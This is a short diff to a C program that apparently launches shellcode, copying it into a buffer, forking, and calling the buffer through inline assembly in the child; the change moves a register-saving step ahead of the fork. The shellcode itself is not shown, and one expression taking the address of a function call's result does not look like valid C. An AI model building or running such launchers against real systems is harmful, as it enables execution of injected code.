@@ -85,6 +85,9 @@ int main(int argc, char **argv) {
   printf("[*] Copying shellcode into crafted buffer.\n");
   memcpy(pcall, shellcode, strlen(shellcode));
 
+  printf("[*] Saving register state..\n");
+  save_regs(&__serialize_regs(cregs));
+
   pid = fork();
 
   if (pid < 0) {
@@ -94,9 +97,6 @@ int main(int argc, char **argv) {
   }
 
   if (!pid) {
-    printf("[*] Saving register state..\n");
-    save_regs(&__serialize_regs(cregs));
-
     printf("[*] Executing the shellcode..\n");
     __asm__ __volatile__("call *%%eax\r\n" : : "a"(pcall));
   } else {
